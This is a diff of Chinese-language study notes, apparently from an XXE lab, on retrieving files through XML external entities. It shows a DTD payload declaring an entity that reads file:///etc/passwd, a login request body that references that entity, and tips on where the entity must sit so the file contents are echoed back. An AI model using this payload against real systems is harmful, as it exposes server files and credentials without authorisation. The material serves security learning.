@@ -25,9 +25,12 @@ tags:
 <user><username>&guc;</username><password>123</password></user>
 ```
 
-![](assets/XXE外部实体检索文件/file-20260104224855022.png)
+![](assets/XXE外部实体检索文件/file-20260104225323168.png)
+
+其中code=0只是代表登录校验没有过，但是外部实体的回显已经成功
 
 ```XML
 <!DOCTYPE root [<!ENTITY guc SYSTEM "file:///etc/passwd">]>
 ```
 最主要还是使用上述DTD声明来测试漏洞
+而且实体也要放在能够回显的位置才可
